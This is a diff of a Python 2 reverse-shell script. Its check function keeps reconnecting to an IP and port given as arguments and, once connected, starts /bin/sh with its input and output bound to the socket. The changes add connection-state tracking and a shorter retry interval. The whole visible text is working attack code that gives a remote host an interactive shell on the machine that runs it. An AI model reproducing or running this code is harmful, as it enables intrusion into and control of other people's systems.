@@ -15,22 +15,32 @@ def usage(name):
 
 
 def check(ip, port):
+    conn = False
+    shell = "/bin/sh"
+    address = (ip, int(port))
     while True:
-        address = (ip, int(port))
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         flag = s.connect_ex(address)
-        shell = "/bin/sh"
         if flag == 0:
             print 'connect success'
             Popen(shell, stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno(), shell=True)
+            conn = True
+            print conn
+            continue
         elif flag == 22:
             s.close()
+            conn = False
+            print conn
+            continue
+        elif flag == 61 and conn == True:
             continue
         elif flag == 61:
+            conn = False
             print 'connect fail'
+            print flag
+
+        time.sleep(1)
         print flag
-        time.sleep(3)
-        continue
 
 if __name__ == '__main__':
     if len(sys.argv) !=3:
